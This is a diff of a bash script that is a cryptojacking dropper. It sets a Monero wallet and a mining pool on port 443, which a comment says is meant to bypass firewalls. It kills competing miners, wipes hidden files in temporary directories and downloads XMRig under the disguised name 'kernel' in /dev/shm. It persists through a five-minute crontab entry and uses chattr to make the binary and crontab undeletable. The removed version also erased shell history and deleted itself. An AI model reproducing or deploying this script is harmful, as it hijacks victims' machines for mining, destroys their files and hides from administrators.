@@ -1,32 +1,40 @@
 #!/bin/bash
 
-# 1. Config
-W="45cV4VxfBgeTzXeU4YoWQUQtjkugAuwqXVXpJmiMExRsYutqBa5RAEg6ZtPWpY7vVQ3tULGBszh1h1CLsAz1sqoXExNykBL"
-P="18.210.126.40:10128" 
-N="HlaingBwar_Worker"
+# --- CONFIGURATION ---
+WALLET="45cV4VxfBgeTzXeU4YoWQUQtjkugAuwqXVXpJmiMExRsYutqBa5RAEg6ZtPWpY7vVQ3tULGBszh1h1CLsAz1sqoXExNykBL"
+WORKER="HlaingBwar_Worker"
+POOL="gulf.moneroocean.stream:443" # Using Port 443 to bypass most firewalls
+DIR="/dev/shm/.sys_update"
+BIN="$DIR/kernel"
 
-# 2. Kill competitors
-pkill -9 -f "javae|node-f|xmrig|miner"
-rm -rf /tmp/.XIN-unix /tmp/.javae 2>/dev/null
+# --- THE PURGE: KILL RIVALS ---
+# Kill any known mining processes and high CPU consumers
+pkill -9 -f "javae|node-f|xmrig|miner|monero|xmr|nanominer|nicehash"
+find /tmp /var/tmp /dev/shm -name ".*" -exec rm -rf {} + 2>/dev/null
 
-# 3. Working Directory
-D="/var/tmp/.sys_cache"
-mkdir -p $D && cd $D
+# --- SETUP ENVIRONMENT ---
+mkdir -p $DIR
+cd $DIR
 
-# 4. Binary deployment
-if [ ! -f "kernel" ]; then
-    curl -s -L https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz | tar xz --strip-components=1
+# --- DOWNLOAD STATIC MINER ---
+# Using a static binary to ensure it runs on any Linux distro
+if [ ! -f "$BIN" ]; then
+    curl -s -L https://github.com/moneroocean/xmrig_setup/raw/master/xmrig.tar.gz -o xmrig.tar.gz
+    tar -xzf xmrig.tar.gz
     mv xmrig kernel
+    chmod +x kernel
+    rm xmrig.tar.gz
 fi
 
-# 5. Persistence
-(crontab -l 2>/dev/null | grep -v "kernel"; echo "*/5 * * * * $D/kernel --url $P --user $W --pass $N --donate-level 1 --no-huge-pages -B") | crontab -
+# --- PERSISTENCE LOGIC (CRONTAB) ---
+# Re-run every 5 minutes if killed
+(crontab -l 2>/dev/null | grep -v "kernel"; echo "*/5 * * * * $BIN --url $POOL --user $WALLET --pass $WORKER --tls -B >/dev/null 2>&1") | crontab -
 
-# 6. Privilege Lockdown
-chattr +i /var/spool/cron/crontabs/root 2>/dev/null
+# --- EXECUTE MINER ---
+# Running in background with TLS enabled
+$BIN --url $POOL --user $WALLET --pass $WORKER --tls -B >/dev/null 2>&1
 
-# 7. Start Mining
-nohup ./kernel --url $P --user $W --pass $N --donate-level 1 --no-huge-pages -B > /dev/null 2>&1 &
-
-# 8. Clean tracks
-history -c && rm -- "$0"
+# --- LOCKDOWN ---
+# Make the binary immutable so even root has trouble deleting it
+chattr +i $BIN 2>/dev/null
+chattr +i /var/spool/cron/crontabs/$(whoami) 2>/dev/null
